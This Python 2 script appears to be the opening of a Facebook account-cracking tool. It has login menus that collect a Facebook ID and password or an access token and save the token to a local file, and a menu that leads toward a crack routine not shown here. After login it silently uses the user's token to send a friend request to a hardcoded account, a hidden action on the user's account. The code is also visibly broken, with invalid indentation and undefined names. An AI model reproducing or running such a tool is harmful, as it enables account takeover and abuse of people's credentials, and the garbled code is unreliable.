import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36')]
merah = '\x1b[1;91m'
lime = '\x1b[1;92m'
kuning = '\x1b[1;93m'
biru = '\x1b[1;94m'
ungu = '\x1b[1;95m'
blue = '\x1b[1;96m'
putih = '\x1b[1;97m'
tutup = '\x1b[0m'

def keluar():
      print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) Your-ip : (Confirmed)'
        ss = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Tool-ip : ')
        if ss == 'a':
            os.system('clear')
            logo()
            print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) Your-ip : (Confirmed)'
            print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) Tool-ip : (Confirmed)'
            time.sleep(1)
            print ''
            print '\x1b[1;92m \xe2\x9c\x93 \x1b[1;95m All Set'
            time.sleep(1)
            login_choice()
            print '[!] Tool-ip : ' + ss + ' (Wrong)'
            time.sleep(1)
            g()
        print '[!] Tool-ip : ' + ip + ' (Wrong)'
        time.sleep(1)
        g()


def login_choice():
    os.system('clear')
    try:
        open('.login.txt', 'r')
        menu()
    except IOError:
        os.system('clear')
        logo()
        print
        os.system('echo -e "<>LOGIN MENU<>" | lolcat')
        logo1()
        print ''
        login_select()
def login_select():
    select = raw_input('\x1b[1;92m\xe2\x80\xa2\xe2\x89\xab \x1b[0;97m')
    if select == '2':
        login_token()
    elif select == '1':
        login_fb()
    else:
        print ''
        print '\t    \x1b[1;31mSelect valid option\x1b[0;97m'
        print ''
        time.sleep(1)
        login_select()


def login_fb():
    os.system('clear')
    logo()
    print
    print '   \x1b[101m\x1b[37;1mLOGIN Fb-ID\x1b[0m'
    print
    id = raw_input(' Id/mail/number: ')
    id1 = id.replace(' ', '')
    id2 = id1.replace('(', '')
    uid = id2.replace(')', '')
    pwd = raw_input(' Password: ')
    print ''
    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd, headers=header).text
    q = json.loads(data)
    if 'loc' in q:
        hamza = open('.login.txt', 'w')
        hamza.write(q['loc'])
        hamza.close()
        requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token=' + q['loc'])
        menu()
    elif 'www.facebook.com' in q['error']:
        print ''
        print '\t    \x1b[1;31mUser must verify account before login\x1b[0;97m'
        time.sleep(1)
        raw_input('\tPress enter to back ')
        login_choice()
    else:
        print ''
        print '\t    \x1b[1;31mIncorrect credentials\x1b[0;97m'
        raw_input('Press enter to try again ')
        login_choice()


def login_token():
    os.system('clear')
    try:
        open('.login.txt', 'r')
        time.sleep(1)
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print
        print '   \x1b[101m\x1b[37;1mLOGIN FB-TOKEN\x1b[0m'
        print
        token = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Paste token : ')
        token_save = open('.login.txt', 'w')
        token_save.write(token)
        token_save.close()
        time.sleep(1)
        menu()


def menu():
    os.system('clear')
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print ''
        logo()
        print ''
        print '\t    \x1b[1;31mToken not found\x1b[0;97m'
        time.sleep(1)
        login_choice()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token, headers=header)
        a = json.loads(r.text)
        name = a['name']
    except KeyError:
        os.system('clear')
        print ''
        logo()
        print ''
        print '\t    \x1b[1;31mToken expired\x1b[0;97m'
        time.sleep(1)
        os.system('rm -rf .login.txt')
        login_choice()

    os.system('clear')
    logo()
    print 47 * '\x1b[1;91m\xe2\x95\x90'
    print '\t\x1b[1;33mWellCome to token id user: ' + name + '\x1b[0;97m'
    print 47 * '\x1b[1;91m\xe2\x95\x90'
    logo2()
    print ''
    menu_option()


def menu_option():
    select = raw_input('\x1b[1;92m\xe2\x80\xa2\xe2\x89\xab\x1b[0;97m ')
    if select == '1':
        crack()
